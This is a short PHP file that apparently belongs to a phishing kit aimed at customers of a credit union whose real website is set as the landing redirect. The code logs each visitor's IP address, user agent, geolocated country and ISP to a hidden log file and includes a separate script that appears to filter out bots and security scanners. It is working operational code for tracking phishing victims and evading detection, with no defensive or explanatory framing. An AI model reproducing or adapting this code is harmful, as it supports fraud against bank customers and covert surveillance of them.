<?php
$LAND='https://www.ncsecu.org';	

?>
<?php
$client  = @$_SERVER["HTTP_CLIENT_IP"];
$forward = @$_SERVER["HTTP_X_FORWARDED_FOR"];
$remote  = @$_SERVER["REMOTE_ADDR"];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
  $_SESSION["_ip_"]  = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION["_ip_"]  = $forward;
}
else{
    $_SESSION["_ip_"]  = $remote;
}
$IP=$_SESSION["_ip_"];
function curl_get_file_contents($URL)
    {
        $c = curl_init();
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_URL, $URL);
        $contents = curl_exec($c);
        curl_close($c);

        if ($contents) return $contents;
        else return FALSE;
    }
$DETAILS= curl_get_file_contents("http://ip-api.com/json/$IP");
$myJSON = json_decode($DETAILS);
$COUNTRYCODE =$myJSON->countryCode;
$COUNTRYNAME = $myJSON->country;
$ISP = $myJSON->isp;


$IP = getenv("REMOTE_ADDR");
         $content = "#> [".$_SERVER['HTTP_USER_AGENT']."][". $_SERVER['REMOTE_ADDR']."] [".$COUNTRYNAME."] [ISP: ".$ISP."] DateTime: ".date('l jS \of F Y h:i:s A')."\r\n";
        $save=fopen("../visit_log.txt","a+");
        fwrite($save,$content);
        fclose($save);
?>
<?php include ('botx.php');?>